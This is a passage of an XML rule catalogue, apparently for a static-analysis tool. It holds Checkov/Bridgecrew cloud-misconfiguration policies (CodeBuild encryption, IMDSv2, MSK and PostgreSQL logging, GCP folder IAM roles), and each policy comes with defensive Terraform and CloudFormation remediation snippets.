<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_api_gateway_stage" "test" {
  ...
  stage_name    = "prod"
+ access_log_settings {
+   destination_arn = "${aws_cloudwatch_log_group.example.arn}"
+   format          = "..."  
+  }
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::ApiGateway::Stage</li>
<li><strong>Argument:</strong> Properties.AccessLogSettings.DestinationArn</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  MyStage:
    Type: AWS::ApiGateway::Stage
    Properties:
      ...
      AccessLogSetting:
        DestinationArn: 'arn:aws:logs:us-east-1:123456789:log-group:example-log-group'
        Format: "..."
        ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_17' target='_blank'> https://docs.bridgecrew.io/docs/logging_17</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_17' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_78</key>
    <name>Ensure CodeBuild project encryption is not disabled (Artifacts)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="codebuild-project-encryption-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-code-build-project-encryption-is-disabled"></div>CodeBuild project encryption is disabled</div><a aria-label="Skip link to CodeBuild project encryption is disabled" class="heading-anchor-icon fa fa-anchor" href="#codebuild-project-encryption-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS CodeBuild is a fully managed build service in the cloud. CodeBuild compiles your source code, runs unit tests, and produces artifacts that are ready to deploy. Build artifacts, such as a cache, logs, exported raw test report data files, and build results, are encrypted by default using CMKs for Amazon S3 that are managed by the AWS Key Management Service. If you do not want to use these CMKs, you must create and configure a customer-managed CMK.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_codebuild_project</li>
<li><strong>Arguments:</strong> encryption_disabled - (Optional) If set to true, output artifacts will not be encrypted. If type is set to NO_ARTIFACTS then this value will be ignored. Defaults to false.<br/>
To fix, either set to false or remove attribute.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_codebuild_project" "project-with-cache" {
  ...
  name           = "test-project-cache"
  artifacts {
+    encryption_disabled = false
  }
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::CodeBuild::Project</li>
<li><strong>Arguments:</strong> Properties.Artifacts - (Optional) If set to true, output artifacts will not be encrypted. If type is set to NO_ARTIFACTS then this value will be ignored. Defaults to false. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  CodeBuildProject:
    Type: AWS::CodeBuild::Project
    Properties: 
      ...
      Artifacts:
        ...
                Type: S3       
-               EncryptionDisabled: True
+               EncryptionDisabled: False
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_30' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_30</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_30' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_79</key>
    <name>Ensure Instance Metadata Service version 1 is not enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="instance-metadata-service-version-1-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-instance-metadata-service-version-1-is-enabled"></div>Instance Metadata Service version 1 is enabled</div><a aria-label="Skip link to Instance Metadata Service version 1 is enabled" class="heading-anchor-icon fa fa-anchor" href="#instance-metadata-service-version-1-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Instance Metadata Service (IMDS) is an on-instance component used by code on the instance to securely access instance metadata. You can access instance metadata from a running instance using one of the following methods:</p>
<ul>
<li>Instance Metadata Service Version 1 (IMDSv1) &#8211; a request/response method</li>
<li>Instance Metadata Service Version 2 (IMDSv2) &#8211; a session-oriented method</li>
</ul>
<p>As a request/response method IMDSv1 is prone to local misconfigurations: </p>
<ul>
<li>Open proxies, open NATs and routers, server-side reflection vulnerabilities.</li>
<li>One way or another, local software might access local-only data.</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_instance</li>
<li><strong>Arguments:</strong> http_tokens - (Optional) Whether or not the metadata service requires session tokens, the mechanism used for Instance Metadata Service Version 2. Can be "optional" or "required". (Default: "optional"). <strong>Set to "required" to enable Instance Metadata Service V2.</strong></li>
</ul>
<p>Alternatively, disable the metadata service altogether by setting <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">http_endpoint = "disabled"</code>.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_instance" "example" {
  ...
  instance_type     = "t2.micro"
+   metadata_options {
        ...
+       http_endpoint = "enabled"
+       http_tokens   = "required"
+  }
  ...
}
</code></pre></div></div>
<p>If setting <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">http_tokens = "required"</code> in a launch template that is being used for a EKS worker/node group, you should consider setting the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">http_put_response_hop_limit = 2</code> per the <a href="https://aws.amazon.com/about-aws/whats-new/2020/08/amazon-eks-supports-ec2-instance-metadata-service-v2/" target="_self">default behavior in EKS</a>.<br/>
Without this setting the default service account in EKS will not be able to access the instance metadata service.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::EC2::LaunchTemplate</li>
<li><strong>Arguments:</strong> Properties.MetadataOptions.HttpEndpoint /  Properties.MetadataOptions.HttpTokens</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  IMDSv1Disabled:
    Type: AWS::EC2::LaunchTemplate
    Properties:
        ...
      LaunchTemplateData:
        ...
+       MetadataOptions:
+         HttpEndpoint: disabled
          
  IMDSv2Enabled:
    Type: AWS::EC2::LaunchTemplate
    Properties:
      ...
      LaunchTemplateData:
        ...
+       MetadataOptions:
+         HttpTokens: required
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_31' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_31</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_31' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_80</key>
    <name>Ensure Amazon MSK cluster logging is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="amazon-msk-cluster-logging-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-amazon-msk-cluster-logging-is-not-enabled"></div>Amazon MSK cluster logging is not enabled</div><a aria-label="Skip link to Amazon MSK cluster logging is not enabled" class="heading-anchor-icon fa fa-anchor" href="#amazon-msk-cluster-logging-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon MSK enables you to build and run applications that use Apache Kafka to process streaming data. It also provides a control-plane for advanced operations, for example, creating, updating, and deleting clusters. </p>
<p>Consistent cluster logging helps you determine if a  request was made with root or AWS Identity and Access Management (IAM) user credentials and whether the request was made with temporary security credentials for a role or federated user.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p><strong>New Cluster</strong>: </p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/msk/" target="_self">Amazon MSK console</a>.</li>
<li>Go to <strong>Broker Log Delivery</strong> in the <strong>Monitoring </strong>section. </li>
<li>Specify the destinations to which you want Amazon MSK to deliver your broker logs.</li>
</ol>
<p><strong>Existing Cluster</strong>:</p>
<ol>
<li>In the <a href="https://console.aws.amazon.com/msk/" target="_self">Amazon MSK console </a> choose the cluster from your list of clusters.</li>
<li>Go to the <strong>Details </strong>tab. Scroll down to the <strong>Monitoring </strong>section and click <strong>Edit</strong>.</li>
<li>Specify the destinations to which you want Amazon MSK to deliver your broker logs.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>When you use the <a href="https://docs.aws.amazon.com/cli/latest/reference/kafka/create-cluster.html" target="_self">create-cluster</a> or the <a href="https://docs.aws.amazon.com/cli/latest/reference/kafka/update-monitoring.html" target="_self">update-monitoring</a> commands, you can optionally specify the logging-info parameter and pass to it a JSON structure. In this JSON, all three destination types are optional.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">JSON</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="">{
  "BrokerLogs": {
    "S3": {
      "Bucket": "ExampleBucketName",
      "Prefix": "ExamplePrefix",
      "Enabled": true
    },
    "Firehose": {
      "DeliveryStream": "ExampleDeliveryStreamName",
      "Enabled": true
    },
    "CloudWatchLogs": {
      "Enabled": true,
      "LogGroup": "ExampleLogGroupName"
    }
  }
}
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_msk_cluster</li>
<li><strong>Argument:</strong> logging_info - (Optional) Configuration block for streaming broker logs to Cloudwatch/S3/Kinesis Firehose. See below. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_msk_cluster" "example" {
  cluster_name           = "example"
  ...
+  logging_info {
+    broker_logs {
+      cloudwatch_logs {
+        enabled   = true
+        log_group = aws_cloudwatch_log_group.test.name
      }
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong>AWS::MSK::Cluster</li>
<li><strong>Argument</strong>LoggingInfo. Configure your MSK cluster to send broker logs to different destination types. This is a container for the configuration details related to broker logs. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">{
  "Type" : "AWS::MSK::Cluster",
  "Properties" : {
      ...
+    "LoggingInfo" : {
+      "BrokerLogs" : {
+        "CloudWatchLogs" : CloudWatchLogs,
+        "Firehose" : Firehose,
+        "S3" : S3
      }
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_18' target='_blank'> https://docs.bridgecrew.io/docs/logging_18</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_18' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_44</key>
    <name>Ensure roles do not impersonate or manage Service Accounts used at folder level</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="roles-impersonate-or-manage-service-accounts-used-at-folder-level"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-roles-impersonate-or-manage-service-accounts-used-at-folder-level"></div>Roles impersonate or manage Service Accounts used at folder level</div><a aria-label="Skip link to Roles impersonate or manage Service Accounts used at folder level" class="heading-anchor-icon fa fa-anchor" href="#roles-impersonate-or-manage-service-accounts-used-at-folder-level"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The IAM role is an identity with specific permissions. An IAM role is similar to an IAM user: it has a Google identity with permission policies that determine what the identity can and cannot do in Google Cloud. Certain IAM roles contain permissions that enable a user with the role to impersonate or manage service accounts in a GCP folder through IAM inheritance from a higher resource, i.e., folder binding.</p>
<p>We recommend you do not set IAM role bindings with known dangerous roles that enable impersonation at the folder level.</p>
<p>The following roles enable identities to impersonate all service account identities within a project if the identity is granted the role at the project, folder, or organization level. The following list includes our <em>current </em>recommendations for dangerous roles, however, it is not exhaustive as permissions and roles change frequently.</p>
<p><strong>Primitive Roles</strong>:</p>
<ul>
<li>roles/owner</li>
<li>roles/editor</li>
</ul>
<p><strong>Predefined Roles</strong>:</p>
<ul>
<li>roles/iam.securityAdmin</li>
<li>roles/iam.serviceAccountAdmin</li>
<li>roles/iam.serviceAccountKeyAdmin</li>
<li>roles/iam.serviceAccountUser</li>
<li>roles/iam.serviceAccountTokenCreator</li>
<li>roles/iam.workloadIdentityUser</li>
<li>roles/dataproc.editor</li>
<li>roles/dataproc.admin</li>
<li>roles/dataflow.developer</li>
<li>roles/resourcemanager.folderAdmin</li>
<li>roles/resourcemanager.folderIamAdmin</li>
<li>roles/resourcemanager.projectIamAdmin</li>
<li>roles/resourcemanager.organizationAdmin</li>
<li>roles/cloudasset.viewer</li>
<li>roles/cloudasset.owner</li>
</ul>
<p><strong>Service Agent Roles</strong>:<br/>
Service agent roles should not be used for any identities other than the Google managed service account they are associated with.</p>
<ul>
<li>roles/serverless.serviceAgent</li>
<li>roles/dataproc.serviceAgent</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>:<br/>
google_folder_iam_member<br/>
google_folder_iam_binding</li>
<li><strong>Argument</strong>: role</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">google_folder_iam_member</button><button type="button">google_folder_iam_binding</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="google_folder_iam_member">resource "google_folder_iam_member" "example" {
  folder  = "folders/1234567"
- role    =  &lt;ANY OF THE ROLES LISTED ABOVE&gt;
  member  = "user:<a class="__cf_email__" data-cfemail="84f0e1f7f0c4e1fce5e9f4e8e1a9f4f6ebeee1e7f0aaede5e9aae3f7e1f6f2ede7e1e5e7e7ebf1eaf0aae7ebe9" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
}
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-json theme-light" data-lang="json" name="google_folder_iam_binding">resource "google_folder_iam_binding" "example" {
  folder  = "folders/1234567"
- role    =  &lt;ANY OF THE ROLES LISTED ABOVE&gt;
  members  = [
  "user:<a class="__cf_email__" data-cfemail="a0d4c5d3d4e0c5d8c1cdd0ccc58dd0d2cfcac5c3d48ec9c1cd8ec7d3c5d2d6c9c3c5c1c3c3cfd5ced48ec3cfcd" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_52</key>
    <name>Ensure GCP PostgreSQL instance database flag log_connections is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-postgresql-instance-database-flag-log_connections-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-postgre-sql-instance-database-flag-log-connections-is-disabled"></div>GCP PostgreSQL instance database flag log_connections is disabled</div><a aria-label="Skip link to GCP PostgreSQL instance database flag log_connections is disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-postgresql-instance-database-flag-log_connections-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>PostgreSQL does not log attempted connections by default. Enabling the <strong>log_connections</strong> setting creates log entries for each attempted connection to the server, along with successful completion of client authentication.  This information can be useful in troubleshooting issues and to determine any unusual connection attempts to the server. </p>
<p>We recommend you set the <strong>log_connections</strong> database flag for Cloud SQL PostgreSQL instances to <strong>on</strong>. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> for which you want to enable the database flag.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>log_connections</strong> from the drop-down menu, and set the value to <strong>on</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the log_connections database flag for every Cloud SQL PosgreSQL database instance using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME --database-flags log_connections=on</code></li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all previously set database flags. To keep those and add new ones, include the values for all flags to be set on the instance; any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign ("=").se flags. To keep those and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "POSTGRES</em>* "<br/>
settings::database_flags: key:"log_connections", value:  by default set to "off"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
+         database_flags {
+            name  = "log_connections"
+            value = "on"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_53</key>
    <name>Ensure GCP PostgreSQL instance database flag log_disconnections is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-postgresql-instance-database-flag-log_disconnections-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-postgre-sql-instance-database-flag-log-disconnections-is-disabled"></div>GCP PostgreSQL instance database flag log_disconnections is disabled</div><a aria-label="Skip link to GCP PostgreSQL instance database flag log_disconnections is disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-postgresql-instance-database-flag-log_disconnections-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling the <strong>log_disconnections</strong> database flag logs the end of each session, including the session duration. PostgreSQL does not log session details by default, including duration and session end details. Enabling the <strong>log_disconnections</strong> database flag creates log entries at the end of each session, useful when troubleshooting issues and determining unusual activity across a time period. </p>
<p>The <strong>log_disconnections</strong> and <strong>log_connections</strong> work hand in hand and usually the pair would be enabled/disabled together. </p>
<p>We recommended you set the <strong>log_disconnections</strong> flag for a PostgreSQL instance to <strong>On</strong>.  </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
